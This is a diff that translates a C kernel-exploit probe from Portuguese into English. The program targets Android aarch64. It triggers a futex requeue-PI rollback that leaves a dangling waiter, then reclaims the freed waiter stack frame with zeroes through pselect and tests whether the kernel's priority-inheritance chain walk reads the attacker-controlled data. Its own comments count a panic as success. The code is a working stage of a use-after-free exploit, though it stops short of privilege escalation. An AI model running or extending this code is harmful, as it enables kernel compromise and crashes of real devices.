@@ -1,27 +1,27 @@
 /*
- * ghostlock_reclaim_try.c — Fase 4: reclaim controlada, 1 shot por boot.
+ * ghostlock_reclaim_try.c — Phase 4: controlled reclaim, 1 shot per boot.
  *
- * Pergunta binaria: o frame liberado do waiter e reocupavel com dados
- * nossos, e o chain walk consome esses valores?
+ * Binary question: is the freed waiter frame re-occupiable with our data,
+ * and does the chain walk consume these values?
  *
- * Desenho (1 target descartavel, 1 padrao conhecido):
- *  - trio waiter/owner + CMP_REQUEUE_PI -> EDEADLK (rollback, dangling).
- *  - teardown limpo; waiter volta ao userspace (frame livre) e IMEDIATO
- *    carimba a propria stack com pselect(nfds=1024, 3x fd_set zerado):
- *    ~384-768B de zeros na profundidade de syscall, sem efeito colateral
- *    (timeout 0, retorno imediato).
- *  - waiter depois gira em spin userspace SEM syscall (sleep chamaria
- *    nanosleep e reusaria a stack por cima do carimbo).
- *  - consumer minimo (setschedparam BATCH/OTHER, o mesmo que deu 60s no
- *    baseline) no waiter vivo.
+ * Design (1 disposable target, 1 known pattern):
+ *  - waiter/owner trio + CMP_REQUEUE_PI -> EDEADLK (rollback, dangling).
+ *  - clean teardown; waiter returns to userspace (freed frame) and IMMEDIATELY
+ *    stamps its own stack with pselect(nfds=1024, 3x zeroed fd_set):
+ *    ~384-768B of zeroes at syscall depth, without side effects
+ *    (timeout 0, immediate return).
+ *  - waiter then spins in userspace WITHOUT syscalls (sleep would invoke
+ *    nanosleep and overwrite the stack on top of the stamp).
+ *  - minimal consumer (setschedparam BATCH/OTHER, same as gave 60s in
+ *    baseline) on the live waiter.
  *
- * Baseline Fase 3 sem carimbo: consumer 60s stall ret 0 (walk seguiu o
- * waiter estagnado). Com zeros no frame:
- *  - POSITIVO: desvio nitido (erro rapido, stall diferente, ou panic) =
- *    walk leu lock=NULL/task=NULL nosso. Panic aqui e dado, nao falha.
- *  - NEGATIVO: 60s ret 0 identico = reclaim errou o slot ou walk nao tocou.
+ * Phase 3 baseline without stamp: consumer 60s stall ret 0 (walk followed the
+ * stagnant waiter). With zeroes in the frame:
+ *  - POSITIVE: distinct deviation (fast error, different stall, or panic) =
+ *    walk read our lock=NULL/task=NULL. Panic here is data, not failure.
+ *  - NEGATIVE: identical 60s ret 0 = reclaim missed the slot or walk didn't touch it.
  *
- * Sem cred, SELinux, funcptr, shellcode, persistencia. Uma execucao.
+ * No cred, SELinux, funcptr, shellcode, persistence. Single execution.
  *
  * Build: aarch64-linux-android28-clang -O2 -Wall -static
  *   ghostlock_reclaim_try.c -o ghostlock_reclaim_try
@@ -71,7 +71,7 @@ static uint64_t now_ns(void) {
     return (uint64_t)ts.tv_sec * 1000000000ULL + (uint64_t)ts.tv_nsec;
 }
 
-/* carimbo: zeros profundos na stack desta thread, sem efeito colateral */
+/* stamp: deep zeroes on this thread's stack, without side effects */
 static void stamp(void) {
     fd_set z;
     FD_ZERO(&z);
@@ -93,8 +93,8 @@ static void *waiter_fn(void *u) {
     xfutex(&f_wait, FWRQ, 0, &ts, &f_target, 0);
     xfutex(&f_chain, FUPI, 0, NULL, NULL, 0);
     w_done = 1;
-    stamp(); /* frame livre agora; reocupa com zeros */
-    /* spin sem syscall: preserva o carimbo ate o processo morrer */
+    stamp(); /* frame freed now; re-occupy with zeroes */
+    /* spin without syscall: preserves the stamp until process exit */
     while (1) {
         __asm__ volatile("" ::: "memory");
     }
@@ -113,7 +113,7 @@ static void *owner_fn(void *u) {
 }
 
 int main(void) {
-    setbuf(stdout, NULL); /* panic mata buffer libc: sem flush, sem evidencia */
+    setbuf(stdout, NULL); /* panic kills libc buffer: no flush, no evidence */
     printf("[info] reclaim try: zeros via pselect + consumer, 1 shot\n");
     f_wait = f_target = f_chain = 0;
     w_ready = w_waiting = w_done = o_started = 0;
@@ -129,7 +129,7 @@ int main(void) {
     int cmpe = errno;
     printf("[reclaim] cmp_errno=%d (%s)\n", cmpe, strerror(cmpe));
     if (cmpe != EDEADLK) {
-        printf("[verdict] NEGATIVO-setup: sem EDEADLK, sem dangling\n");
+        printf("[verdict] NEGATIVE-setup: no EDEADLK, no dangling pointer\n");
         return 3;
     }
     xfutex(&f_target, FUPI, 0, NULL, NULL, 0);
@@ -138,10 +138,10 @@ int main(void) {
     while (!w_done && spins++ < 150)
         usleep(20000);
     if (!w_done) {
-        printf("[verdict] ABORT: waiter nao voltou\n");
+        printf("[verdict] ABORT: waiter did not return\n");
         return 2;
     }
-    /* waiter carimbou e gira em spin; consumer no estado corrompido */
+    /* waiter stamped and spins; consumer in corrupted state */
     struct sched_param p = { .sched_priority = 0 };
     uint64_t t0 = now_ns();
     errno = 0;
@@ -156,7 +156,7 @@ int main(void) {
            r1, e1, r1 ? strerror(e1) : "ok",
            (unsigned long long)(t1 - t0), r2, e2,
            r2 ? strerror(e2) : "ok", (unsigned long long)(t2 - t1));
-    printf("[verdict] baseline era 60s/ret0: desvio nitido=POSITIVO, igual=NEGATIVO\n");
+    printf("[verdict] baseline was 60s/ret0: distinct deviation=POSITIVE, identical=NEGATIVE\n");
     pthread_detach(w);
     return 0;
 }
